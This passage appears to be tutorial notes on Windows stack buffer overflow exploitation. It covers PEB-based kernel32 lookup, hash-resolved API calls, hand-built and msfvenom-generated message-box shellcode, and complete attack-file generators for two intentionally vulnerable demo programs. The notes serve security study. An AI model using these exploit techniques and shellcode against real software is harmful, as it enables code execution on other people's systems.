&lt;&lt; &quot;failed to open file\\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\\&quot;.\\n&quot;;\t\treturn -1;\t&#125;\t\tBinaryArray array;\tif (!read_binary(fin, array)) &#123;\t\tcerr &lt;&lt; &quot;failed to parsed file \\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\\&quot;.\\n&quot;;\t\treturn -1;\t&#125;\t\tunsigned count_per_line = 16;\tif (argc &gt;= 3) count_per_line = atoi(argv[2]);\tcout &lt;&lt; &quot;//Read \\&quot;&quot; &lt;&lt; argv[1] &lt;&lt; &quot;\\&quot;\\n&quot;\t\t &lt;&lt; &quot;//Size: &quot; &lt;&lt; array.size() &lt;&lt; &quot; bytes\\n&quot;\t\t &lt;&lt; &quot;//Count per line: &quot; &lt;&lt; count_per_line &lt;&lt; &quot;\\n&quot;;\tunsigned null_count = output_hex(array, count_per_line);\tcout &lt;&lt; &quot;//NULL count: &quot; &lt;&lt; null_count &lt;&lt; &#x27;\\n&#x27;;&#125;unsigned output_hex(BinaryArray const &amp;carr, unsigned const cpl) &#123;\tunsigned null = 0;\tcout &lt;&lt; &quot;char code[] = \\n\\&quot;&quot;;\tfor (size_t i = 1; i &lt;= carr.size(); ++i) &#123;\t\tcout &lt;&lt; &quot;\\\\x&quot; &lt;&lt; hex &lt;&lt; setw(2)\t\t\t &lt;&lt; setfill(&#x27;0&#x27;) &lt;&lt; (unsigned)(carr[i-1]);\t\tif (!(i % cpl)) &#123;\t\t\tcout &lt;&lt; &quot;\\&quot;\\n&quot;;\t\t\tif (i &lt; carr.size())\t\t\t\tcout &lt;&lt; &#x27;\\&quot;&#x27;;\t\t&#125;\t\t\t\tif (!(carr[i-1]))\t\t\t++null;\t&#125;\t\tif (carr.size() % cpl)\t\tcout &lt;&lt; &#x27;\\&quot;&#x27;;\tcout &lt;&lt; &quot;;\\n&quot;;\t\treturn null;&#125;bool read_binary(ifstream&amp; fin, BinaryArray&amp; arr) &#123;\ttry &#123;\t\tunsigned file_length;\t\t\t\tfin.seekg(0, ios::end);\t\tfile_length = fin.tellg();\t\tfin.seekg(0, ios::beg);\t\t\t\tarr.resize(file_length);\t\tchar *mem_buf = new char[file_length];\t\tfin.read(mem_buf, file_length);\t\tcopy(mem_buf, mem_buf + file_length, arr.begin());\t\tdelete[] mem_buf;\t&#125; catch (...) &#123;\t\treturn false;\t&#125;\t\treturn true;&#125;void usage() &#123;\tcout &lt;&lt; &quot;Usage: fonReadbin &lt;asm_bin_file&gt; [count_per_line=16]\\n&quot;\t\t &lt;&lt; &quot;Read binary data from the file and output the hex string for C/C++\\n&quot;\t\t &lt;&lt; &quot;Version: 1.0\\n&quot;\t\t &lt;&lt; &quot;Example: ./fonReadBin shellcode.asm 32&quot;;&#125;\n3.6 - Review the First ShellcodeMostly, a PE file which compiled with Dev-C++ loads msvcrt.dll.\nOn Windows XP, a PE file typically have a fixed ImageBase.However, starting from Windows Vista, ASLR randomizes the ImageBase.\n\n\n\n\n\n\nObtain the ImageBase Address of kernel32.dll via PEB\n\n\n\n\n\n\n\\begin{align*}\nFS + 0x00 &= \\&\\_TEB\\\\\n &= \\&(\\_TEB.NtTib)\\\\\n &= \\&(\\_TEB.NtTib.ExceptionList)\\\\\n\nFS + 0x18 &= \\&(\\_TEB.NtTib.Self)\\\\\n&= \\&(\\&(\\_TEB.NtTib))\\\\\n&= \\&(\\&(\\_TEB))\\\\\n\nFS + 0x30 &= \\&(\\_TEB.ProcessEnvironmentBlock)\\\\\n&= \\&(\\&(\\_PEB))\n\\end{align*}These three expresions are equivalent to:\n\n\\begin{align*}\n*(FS+0x00) &= \\_TEB\\\\\n&=\\_TEB.NtTib\\\\\n&=\\_TEB.NtTib.ExceptionList\\\\\n\n*(FS+0x18) &= \\_TEB.NtTib.Self\\\\\n&=(\\_TEB.NtTib)\\\\\n&=(\\_TEB)\\\\\n\n*(FS+0x30) &= \\_TEB.ProcessEnvironmentBlock\\\\\n&= \\&(\\_PEB)\n\\end{align*}\nint main()&#123;    __try    &#123;        int i = 0;    &#125;    __except(1)    &#123;        int j = 1;    &#125;    return 0;&#125;\nThis code has assembly codes like this:PUSH EBPMOV EBP,ESPPUSH FFPUSH 00404000PUSH 00401140MOV EAX,FS:[00000000]PUSH EAXMOV DWORD PTR FS:[00000000],ESP\nWe can rewrite the relationship of FS and _TEB in form of FS:[Offset]\n\n\\begin{align*}\nFS:[0x00] &= \\_TEB\\\\\n&=\\_TEB.NtTib\\\\\n&=\\_TEB.NtTib.ExceptionList\\\\\n\nFS:[0x18] &= \\_TEB.NtTib.Self\\\\\n&=(\\_TEB.NtTib)\\\\\n&=(\\_TEB)\\\\\n\nFS:[0x30] &= \\_TEB.ProcessEnvironmentBlock\\\\\n&= \\&(\\_PEB)\n\\end{align*}\n0:000&gt; dt ntdll!_CLIENT_ID\n\n\n\n0:000&gt; dt ntdll!_PEB_LDR_DATA\n\n\n\n0:000&gt; !peb\n\n\n\n0:000&gt; dt ntdll!_PEB_LDR_DATA 774b5da0\n\n\n\n0:000&gt; dt ntdll!_PEB_LDR_DATA 774b5dbc\n\n774b5da0 + 0x01c = 774b5dbc\n\n\n0:000&gt; dl 774b5dbc\n\n\n\nObtain LoadLibraryA() from the ImageBase of kernel32.dll0:000&gt; lm\n\n\n\n0:000&gt; db 75540000\n\n\n\n0:000&gt; dt _IMAGE_DOS_HEADER\n\n\n\n0:000&gt; dd (75540000+0x03c)\n\n\n\n0:000&gt; dd (75540000+0x03c) l1\n\n\n\n0:000&gt; dt ntdll!_IMAGE_OPTIONAL_HEADER (75540000+0xe8+0x18)\n\n\n\n0:000&gt; dt ntdll!_IMAGE_DATA_DIRECTORY (75540000+0xe8+0x18+0x60)\n\n\n\nSo, the absolute address of in its virtual memory is:\n\n\\begin{align*}\nAbsolute Virtual Address (VA) &= RVA + ImageBase\\\\\n&= 0x75540000 + 0x93920\\\\\n&= 0x755d3920\n\\end{align*}\ntypedef struct _IMAGE_EXPORT_DIRECTORY &#123;\tDWORD\tCharacteristics;\tDWORD\tTimeDateStamp;\tWORD\tMajorVersion;\tWORD\tMinorVersion;\tDWORD\tName;\tDWORD\tBase;\tDWORD\tNumberOfFunctions;\tDWORD\tNumberOfNames;\tDWORD\tAddressOfFunctions;\tDWORD\tAddressOfNames;\tDWORD\tAddressOfNameOrdinals;&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\nTo obtain the data of NumberofNames, AddressOfFunctions, AddressofNames and AddressOfNameOrdinals. We have to calculate the virtual addresses using the offsets:\n\n\\text{Given: ImageBase = 0x75540000. Therefore:}\\\\\n\\begin{align*}\n\\text{VA of NumberOfNames} &= Size(DWORD) \\times 5 + Size(WORD) \\times 2\\\\\n&= Size(WORD) \\times 2 \\times 5 + Size(WORD) \\times 2\\\\\n&= Size(WORD) \\times 12\\\\\n&= Size(unsigned short) \\times 2 \\times 12\\\\\n&= 24_{10} \\enspace bytes\\\\\n&= 18_{16} (\\text{or 0x18}) \\enspace bytes\\\\\n\n\\\\\n\n\\text{VA of AddressOfFunctions} &= \\text{VA of NumberOfNames} + Size(DWORD)\\\\\n&= \\text{0x18} + \\text{0x4 bytes}\\\\\n&= \\text{0x1c bytes}\\\\\n\n\\\\\n\n\\text{VA of AddressOfNames} &= \\text{VA of AddressOfFunctions} + Size(DWORD)\\\\\n&= \\text{0x1c + 0x4 bytes}\\\\\n&= \\text{0x20 bytes}\\\\\n\n\\\\\n\n\\text{VA of AddressOfNameOrdinals} &= \\text{VA of AddressOfNames} + Size(DWORD)\\\\\n&= \\text{0x20 + 0x4 bytes}\\\\\n&= \\text{0x24 bytes}\\\\\n\\end{align*}0:000&gt; dd (75540000+0x93920+0x18) l10:000&gt; dd (75540000+0x93920+0x1c) l10:000&gt; dd (75540000+0x93920+0x20) l10:000&gt; dd (75540000+0x93920+0x24) l1\n\n\n\nThus, the addresses of the arrays are:\n\n\\begin{align*}\nFunctions &= \\text{75540000 + 0x3948}\\\\\nNames &= \\text{75540000 + 0x95270}\\\\\nOrdinals &= \\text{75540000 + 0x96b98}\n\\end{align*}db (0x75540000+0x3948) l40db (0x75540000+0x95270) l40db (0x75540000+0x96b98) l40\n\n\n\n0:000&gt; da (75540000+0x097898)\n\n\n\n\n\nThe Hash Value of a Functionextern char *c;unsigned h = 0;while (*c) h = ((h&lt;&lt;5) | (h&gt;&gt;27))+*c++;\n\ncompute_hash:    xor edi, edi    xor eax, eax    cldcompute_hash_again:    lodsb    test al, al    jz compute_hash_finished    ror edi, 0xd    add edi, eax    jmp compute_hash_againcompute_hash_finished:\nextern char *c;unsigned h = 0;whle (*c) h=((h&lt;19) | (h&gt;&gt;3))+*c++;\ncld: clear direction-flag.lodsb: Loads a byte, word, or doubleword from the source operand into the AL, AX, or EAX register, respectively.ror: rotate right.\n//fonSimpleHash.cpp#include &lt;iostream&gt;#include &lt;iomanip&gt;#include &lt;string&gt;using namespace std;unsigned const ROTATE_CONSTANT = 13;unsigned hash(string const &amp;s) &#123;\tchar const *c = s.c_str();\tunsigned h = 0;\twhile (*c) h = ((h&lt;&lt;(32-ROTATE_CONSTANT)) | (h&gt;&gt;ROTATE_CONSTANT))+*c++;\t\treturn h;&#125;unsigned little_endian(unsigned h) &#123;\treturn (h&lt;&lt;24) | (h&lt;&lt;8 &amp; 0x00FF0000) | (h&gt;&gt;8 &amp; 0x0000FF00) | (h&gt;&gt;24);&#125;void usage() &#123;\tcout &lt;&lt; &quot;Usage: fonsimplehash &lt;Function Name&gt; [Funtion Name #2 #3 ...]\\n&quot;\t\t &lt;&lt; &quot;Output hash values for input function names\\n&quot;\t\t &lt;&lt; &quot;Version 1.0\\n&quot;\t\t &lt;&lt; &quot;Example1: ./fonsimplehash LoadLibraryA\\n&quot;\t\t &lt;&lt; &quot;Example2: ./fonsimplehash LoadLibraryA WinExec ExitThread\\n&quot;\t\t &lt;&lt; &quot;Or you can put function names in a text file, ex: names.txt,\\n&quot;\t\t \t&quot;\tone function name per line, and try ./fonsimplehash &lt; names.txt\\n&quot;;&#125;int main(int argc, char* argv[]) &#123;\tif (argc &lt;= 1) usage();\telse &#123;\t\tcout &lt;&lt; left &lt;&lt; setw(24) &lt;&lt; &quot;Function Name&quot; &lt;&lt; setw(12) &lt;&lt; &quot;Hash Value&quot; &lt;&lt; &#x27;\\n&#x27;\t\t\t &lt;&lt; setw(24) &lt;&lt; &quot;---------&quot; &lt;&lt; setw(12) &lt;&lt; &quot;-----------&quot; &lt;&lt; &#x27;\\n&#x27;;\t\t\t\tfor (int i = 1; i &lt; argc; ++i) &#123;\t\t\tcout &lt;&lt; setw(24) &lt;&lt; argv[i]\t\t\t\t &lt;&lt; hex &lt;&lt; setw(12) &lt;&lt; little_endian(hash(argv[i])) &lt;&lt; &#x27;\\n&#x27;;\t\t&#125;\t&#125;&#125;\n\n\n\nThe completed shellcode:[Section .text][BITS 32]global _start_start:    jmp KERNEL32_BASEFIND_FUNCTION:    pushad    mov ebp,[esp+0x24]    mov eax,[ebp+0x3c]    mov edx,[ebp+eax+0x78]    add edx,ebp    mov ecx,[edx+0x18]    mov ebx,[edx+0x20]    add ebx,ebpFIND_FUNCTION_LOOP:    jecxz FIND_FUNCTION_END    dec ecx    mov esi,[ebx+ecx*4]    add esi,ebpCOMPUTE_HASH:    xor edi,edi    xor eax,eax    cldCOMPUTE_HASH_LOOP:    lodsb    test al,al    jz COMPUTE_HASH_END    ror edi,0xd    add edi,eax    jmp COMPUTE_HASH_LOOPCOMPUTE_HASH_END:    cmp edi,[esp+0x28]    jnz FIND_FUNCTION_LOOP    mov ebx,[edx+0x24]    add ebx,ebp    mov cx,[ebx+ecx*2]    mov ebx,[edx+0x1c]    add ebx,ebp    mov eax,[ebx+ecx*4]    add eax,ebp    mov [esp+0x1c],eaxFIND_FUNCTION_END:    popad    retKERNEL32_BASE:    xor eax,eax    mov ebx,[fs:eax+0x30]    mov ebx,[ebx+0x0c]    add ebx,0x1cKERNEL32_BASE_NEXT_MODULE:    mov ebx,[ebx]    mov ecx,[ebx+0x08]    mov edx,[ebx+0x20]    cmp [edx+0x18],al    jne KERNEL32_BASE_NEXT_MODULE    push 0xec0e4e48    push ecx    call FIND_FUNCTION    push 0x00006c6c    push 0x642e7472    push 0x6376736d    push esp    call eax    push 0xd5a73c1e    push eax    call FIND_FUNCTION    mov ecx,eax    mov DWORD [esp+0x04],0xcd481e74    call FIND_FUNCTION    mov edx,eax    push 0x00000A21    push 0x646C726F    push 0x57202C6F    push 0x6C6C6548    mov esi,esp    xor eax,eax    push eax    push edx    push esi    call ecx    pop edx    pop edx    call edx\n\n\n\n#include &lt;cstdio&gt;using namespace std;char shellcode[] =&quot;\\xeb\\x4e\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea&quot;&quot;\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee&quot;&quot;\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d\\x01\\xc7\\xeb&quot;&quot;\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\\x0c\\x4b&quot;&quot;\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3&quot;&quot;\\x31\\xc0\\x64\\x8b\\x58\\x30\\x8b\\x5b\\x0c\\x83\\xc3\\x1c\\x8b\\x1b\\x8b\\x4b&quot;&quot;\\x08\\x8b\\x53\\x20\\x38\\x42\\x18\\x75\\xf3\\x68\\x48\\x4e\\x0e\\xec\\x51\\xe8&quot;&quot;\\x8e\\xff\\xff\\xff\\x68\\x6c\\x6c\\x00\\x00\\x68\\x72\\x74\\x2e\\x64\\x68\\x6d&quot;&quot;\\x73\\x76\\x63\\x54\\xff\\xd0\\x68\\x1e\\x3c\\xa7\\xd5\\x50\\xe8\\x71\\xff\\xff&quot;&quot;\\xff\\x89\\xc1\\xc7\\x44\\x24\\x04\\x74\\x1e\\x48\\xcd\\xe8\\x62\\xff\\xff\\xff&quot;&quot;\\x89\\xc2\\x68\\x21\\x0a\\x00\\x00\\x68\\x6f\\x72\\x6c\\x64\\x68\\x6f\\x2c\\x20&quot;&quot;\\x57\\x68\\x48\\x65\\x6c\\x6c\\x89\\xe6\\x31\\xc0\\x50\\x52\\x56\\xff\\xd1\\x5a&quot;&quot;\\x5a\\xff\\xd2&quot;;//NULL count: 4typedef void (*FUNCPTR) ();int main() &#123;\tprintf(&quot;Starting to execute shellcode:\\n&quot;);\tFUNCPTR fp = (FUNCPTR)shellcode;\tfp();\t\tprintf(&quot;This line will not be displayed since we call exit()&quot;);&#125;\n3.7 - Metasploit Payload——Hello World! MessageBox()3.8 - The differences of Windows Operating Systems, x32 and x64Chapter 4 - Practical Attack4.1 - Different Operating Systems and CompilersDEP stands for Data Execution Prevention.\nASLR stands for Address Space Layout Randomization.\n4.2 - Example: C Language//vulnerable001.c//filename: vulnerable001.c#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;void do_something(FILE *pfile) &#123;\tchar buf[128];\tfscanf(pfile, &quot;%s&quot;, buf);\t\t//do file reading and parsing below\t//...&#125;int main(int argc, char* argv[]) &#123;\tchar dummp[1024];\tFILE *pfile;\t\tprintf(&quot;Vulnerable001 starts...&quot;);\t\tif (argc&gt;=2) pfile = fopen(argv[1], &quot;r&quot;);\tif (pfile) do_something(pfile);\t\tprintf(&quot;Vulnerable001 ends...\\n&quot;);\t\treturn 0;&#125;\n//attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;int main() &#123;\tstring junk(140, &#x27;A&#x27;);\tstring eip(&quot;\\xEF\\xBE\\xAD\\xDE&quot;);\tstring padding(&quot;BBBBCCCCDDDDEEEEFFFFGGGG&quot;);\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; junk &lt;&lt; eip &lt;&lt; padding;\t\tcout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWe can use Immunity Debugger to find the opcode of PUSH ESP # RETN:!mona jmp -r esp\n\n\n\nHere we can use the address 0x7c874f13 (or others you want). Then our attack program is://attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;int main() &#123;\tstring junk(140, &#x27;A&#x27;);\tstring eip(&quot;\\x13\\x4f\\x87\\x7c&quot;); //0x7c874f13, little-endian\tstring shellcode(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); //shellcode\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; junk &lt;&lt; eip &lt;&lt; shellcode;\t\tcout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;OK&quot;;&#125;\n\n\n\nGenerate shellcode with msfvenom (msfpayload is used in this book. However, it has been deprecated and replaced by msfvenom).\nkali$ msfvenom -p windows/messagebox TEXT=&quot;Hello world&quot; TITLE=&quot;BOF Test&quot; -f c\n\n\n\nAttack script://attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;char buf[] = &quot;\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52&quot;&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x0f\\xb7\\x4a\\x26\\x8b\\x72\\x28&quot;&quot;\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d&quot;&quot;\\x01\\xc7\\x49\\x75\\xef\\x52\\x8b\\x52\\x10\\x57\\x8b\\x42\\x3c\\x01&quot;&quot;\\xd0\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x8b\\x58\\x20\\x8b&quot;&quot;\\x48\\x18\\x01\\xd3\\x50\\x85\\xc9\\x74\\x3c\\x49\\x8b\\x34\\x8b\\x31&quot;&quot;\\xff\\x01\\xd6\\x31\\xc0\\xc1\\xcf\\x0d\\xac\\x01\\xc7\\x38\\xe0\\x75&quot;&quot;\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\\x8b\\x58\\x24\\x01&quot;&quot;\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01&quot;&quot;\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58&quot;&quot;\\x5f\\x5a\\x8b\\x12\\xe9\\x80\\xff\\xff\\xff\\x5d\\xe8\\x0b\\x00\\x00&quot;&quot;\\x00\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\\x68\\x4c&quot;&quot;\\x77\\x26\\x07\\xff\\xd5\\x6a\\x00\\xe8\\x09\\x00\\x00\\x00\\x42\\x4f&quot;&quot;\\x46\\x20\\x54\\x65\\x73\\x74\\x00\\xe8\\x0c\\x00\\x00\\x00\\x48\\x65&quot;&quot;\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x00\\x6a\\x00\\x68\\x45&quot;&quot;\\x83\\x56\\x07\\xff\\xd5\\x6a\\x00\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;int main() &#123;\tstring junk(140, &#x27;A&#x27;);\tstring eip(&quot;\\x13\\x4f\\x87\\x7c&quot;); //0x7c874f13, little-endian\tstring debug(&quot;\\xcc\\xcc\\xcc\\xcc&quot;);\tstring shellcode(buf); //shellcode\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; junk &lt;&lt; eip &lt;&lt; debug &lt;&lt; shellcode;\t\tcout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;Normally, we will be failed. The reason is our shellcode contains a null character (\\x00).\n\n\n\nNow, lets solve this problem with msfvenom:msfvenom -p windows/messagebox TEXT=&quot;Hello world&quot; TITLE=&quot;BOF Test&quot; -f c -b &#x27;\\x0c\\x0d\\x20\\x1a\\x00\\x0a\\x0b&#x27;\n\n\n\nFinal attack script://attack-vulnerable001.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Exploit.txt&quot;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123;\tstring junk(140, &#x27;A&#x27;);\tstring eip(&quot;\\x13\\x4f\\x87\\x7c&quot;); //0x7c874f13, little-endian\tstring debug(&quot;\\xcc\\xcc\\xcc\\xcc&quot;);\tstring nops(8, &#x27;\\x90&#x27;);\tstring shellcode(buf); //shellcode\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; junk &lt;&lt; eip &lt;&lt; nops &lt;&lt; shellcode;\t\tcout &lt;&lt; &quot;Attack file: &quot; &lt;&lt; FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;\n\n\n\n4.3 - Example: From C Language to C++We need to determine whether a buffer overflow vulnerability exists.//vulnerable002.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;void do_something(ifstream&amp; fin) &#123;\tchar buf[1024];\tfin &gt;&gt; buf;&#125;int main(int argc, char **argv) &#123;\tchar dummy[1024];\tifstream fin;\tcout &lt;&lt; &quot;Vulnerable002 starts...\\n&quot;;\t\tif (argc&gt;=2) fin.open(argv[1]);\tif(fin) do_something(fin);\t\tcout &lt;&lt; &quot;Vulnerable002 ends...\\n&quot;;&#125;//attack-vulnerable002.cpp#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;int main() &#123;\tstring junk(1100, &#x27;A&#x27;);\t\tofstream fout(EXPLOIT_FILENAME);\tfout &lt;&lt; junk;\t\tcout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;\n\n\n\n[EIP]=41414141. According to the result, a buffer overflow vulnerability exists.\nDetermine the offset:!mona pattern_create 1100\n\n\n\n\n\n\n!mona pattern_offset 69423569\n\n\n\nHence, the offset is 1036.\nAttack script://attack-vulnerable002.cpp#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;int main() &#123;\tstring junk(1036, &#x27;A&#x27;);\tstring eip(&quot;\\xef\\xbe\\xad\\xde&quot;);\tstring postdata(&quot;BBBBCCCCDDDDEEEEFFFF&quot;);\t\tofstream fout(EXPLOIT_FILENAME);\tfout &lt;&lt; junk &lt;&lt; eip &lt;&lt; postdata;\t\tcout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;\n\n\n\nOur exploitation is successful.\nNow, we neeed to obtain the opcode of PUSH ESP # RET:!mona jmp -r esp\n\n\n\nHere, we are going to use 0x7c836b80. This is the value for EIP. Thus, our exploit script is://attack-vulnerable002.cpp#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123;\tstring junk(1036, &#x27;A&#x27;);\tstring eip(&quot;\\x80\\x6b\\x83\\x7c&quot;);\tstring debug(&quot;\\xcc\\xcc\\xcc\\xcc&quot;);\tstring nops(8, &#x27;\\x90&#x27;);\tstring shellcode(buf);\t\tofstream fout(EXPLOIT_FILENAME, ios::binary);\tfout &lt;&lt; junk &lt;&lt; eip &lt;&lt; debug &lt;&lt; nops &lt;&lt; shellcode;\t\tcout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125;\n4.4 - Example: Attacking Network Applications4.5 - Practice: KMPlayer4.6 - Practice: DVD X Player4.7 - Practice: Easy File Sharing FTP Server4.8 - Practice: Apple QuickTimeChapter 5 - Changes of 